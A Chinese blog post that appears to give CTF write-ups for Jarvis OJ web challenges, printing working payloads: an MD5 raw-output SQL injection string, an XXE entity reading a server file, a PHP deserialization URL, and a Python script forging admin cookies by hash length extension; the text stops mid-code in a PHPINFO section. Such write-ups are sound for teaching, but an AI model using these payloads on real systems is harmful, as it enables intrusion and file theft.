<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Jarvis OJ Writeup | Cyris&#39;s pen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="Jarvis OJ Writeup">
<meta property="og:url" content="https://cyris.pen.moe/posts/jarvisoj-wp/index.html">
<meta property="og:site_name" content="Cyris&#39;s pen">
<meta property="og:description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://cyris.pen.moe/posts/jarvisoj-wp/1.png">
<meta property="og:image" content="https://cyris.pen.moe/posts/jarvisoj-wp/PHPINFO-1.png">
<meta property="og:updated_time" content="2018-04-01T06:23:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jarvis OJ Writeup">
<meta name="twitter:description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
<meta name="twitter:image" content="https://cyris.pen.moe/posts/jarvisoj-wp/1.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  
	<!-- If needed, replace your own web font service -->
  <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700" rel="stylesheet">

  
   
  <link rel="stylesheet" href="/icomoon/style.css">
  <link rel="stylesheet" href="/style.css">

</head>

<body>
  <div class="site-wrapper">
    <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<script>document.getElementById("loading-bar").style.width="20%";</script>


<header id="header" class="site-header clearfix">

  <a class="logo square clearfix" href="/">
    <!-- 
      Replace with your own size name, for example:
      <span class="b">A</span>
      <span class="w">B</span>
      <span class="b">C</span>
     -->
    
      <span class="b">
        C
      </span>
    
      <span class="b">
        y
      </span>
    
      <span class="b">
        r
      </span>
    
      <span class="w">
        i
      </span>
    
      <span class="b">
        s
      </span>
    
      <span class="w">
        '
      </span>
    
      <span class="b">
        s
      </span>
    
      <span class="w">
         
      </span>
    
      <span class="b">
        p
      </span>
    
      <span class="w">
        e
      </span>
    
      <span class="b">
        n
      </span>
    
  </a>
  <a class="me square site-nav-switch clearfix">
    <span class="b">
    	<span class="icon icon-menu"></span>
    </span>
  </a>

</header>

    <script>document.getElementById("loading-bar").style.width="40%";</script>
    <main id="main" class="clearfix">
      <article id="post-jarvisoj-wp"
  class="article white-box article-type-post"
  itemscope itemprop="blogPost">

  <header class="article-header">
    <h1 class="article-title" itemprop="name">
      Jarvis OJ Writeup
    </h1>
    <div class="article-meta">
      Posted on 
      <time class="article-time" datetime="2017-11-04T03:23:21.000Z" itemprop="datePublished">
        Nov 4, 2017
      </time>
    </div>
  </header>

  <div class="article-entry" itemprop="articleBody">
    <p>记录一些 Jarvis OJ 上的题。</p>
<p>平台地址：<a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p>
<a id="more"></a> 
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>需要密码才能获得flag哦。     </p>
<p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
<p>在 Headers 里找到一条hint：  </p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
<p>涉及到一个MD5加密后的注入问题。    </p>
<p>关于这条md5语句我们先来看下php手册中的描述：</p>
<blockquote>
<p><strong>Description</strong></p>
<p>string md5 ( string str [, bool raw_output] )</p>
<p>Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p>
<p>注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p>
</blockquote>
<p>也就是说，如果md5后的hex转换成字符串后，若包含 <code>&#39;or&#39;&lt;trash&gt;</code> 这样的字符串，那整个sql语句就会变成：   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE <span class="keyword">pass</span> = <span class="string">''</span>o<span class="string">r'&lt;trash&gt;'</span></span><br></pre></td></tr></table></figure>
<p>就可以进行注入了。   </p>
<p>网上找到一个字符串：<code>ffifdyop</code></p>
<p>md5以后：<code>276f722736c95d99e921722cf9ed621c</code></p>
<p>再转换成字符串即为<code>&#39;or&#39;&lt;trash&gt;</code>  </p>
<p>把上面这个字符串作为 password 传入即可。  </p>
<hr>
<h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
<p>直接能看到源码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 <a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXE漏洞</a> ，简单地说就是利用 <code>xml</code> 中的 <code>Entity</code> 实体来读取文件或者执行系统命令等，以造成攻击。  </p>
<p>这题里先把 <code>Content-Type</code> 改成 <code>application/xml</code>，然后构造：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT methodname ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以获取flag了。</p>
<hr>
<h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
<p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
<p>扫了一下目录，只发现了 <code>showing.php</code> 和 <code>index.php</code>。</p>
<p>查看源码发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 <code>showing.php</code> 本身：</p>
<p><img src="/posts/jarvisoj-wp/1.png" alt=""></p>
<p>可以看到源码，过滤了 <code>pctf</code> 。但是没什么利用方式，如果直接查看 <code>/pctf.php</code> 拿到的是假flag。同样的方式读取 <code>index.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后拿到 <code>shield.php</code> 的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>shield.php</code> 中说flag在 <code>pctf.php</code> 里，但是在 <code>showing.php</code> 中被过滤了，所以直接读它拿到的是假flag。留意到 <code>index.php</code> 里用了反序列化，可以利用这点构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Shield();</span><br><span class="line">    $a-&gt;file = <span class="string">"pctf.php"</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>序列化后的结果为：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32768</span>/?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">    //Fake flag:</span></span><br><span class="line"><span class="comment">    echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>只有管理员才能获得flag，你能想办法获得吗？</p>
<p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
<p>vim备份文件泄露（ <code>/index.php~</code> ），恢复后拿到源码（题目有点问题，<code>vim -r</code> 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">        &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">            body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;  </span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">            $role = <span class="string">"guest"</span>;   </span><br><span class="line">            $salt = ;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">                $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </span><br><span class="line">                    $auth = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    $auth = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;&#125;   </span><br><span class="line">                $s = serialize($role);</span><br><span class="line">                setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                $hsh = md5($salt.strrev($s));</span><br><span class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span>  </span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>核心语句为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">role===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))</span></span><br></pre></td></tr></table></figure></p>
<p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
<p>做题的时候整理了一下这里涉及的知识点 - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/" target="_blank" rel="noopener">传送门</a></p>
<p>利用工具：</p>
<blockquote>
<p><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">hash_extender</a></p>
</blockquote>
<p>已有条件：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie-hsh：<span class="number">3</span>a<span class="number">4727</span>d<span class="number">57463</span>f<span class="number">122833</span>d<span class="number">9</span>e<span class="number">732</span>f<span class="number">94</span>e<span class="number">4</span>e<span class="number">0</span></span><br><span class="line">Cookie-role：s<span class="meta">%</span><span class="number">3</span>A<span class="number">5</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">22</span>guest<span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">3</span>B</span><br><span class="line">需要求：md<span class="number">5</span><span class="comment">(salt+strrev(admin)</span>)</span><br><span class="line">* salt长度未知</span><br></pre></td></tr></table></figure></p>
<p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到回显：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">12</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	body &#123;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">background</span><span class="selector-pseudo">:gray</span>;</span></span><br><span class="line"><span class="css">		<span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时也可以知道 salt 的长度为12。</p>
<hr>
<h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
<p>上来就给出了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>); <span class="comment">//设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 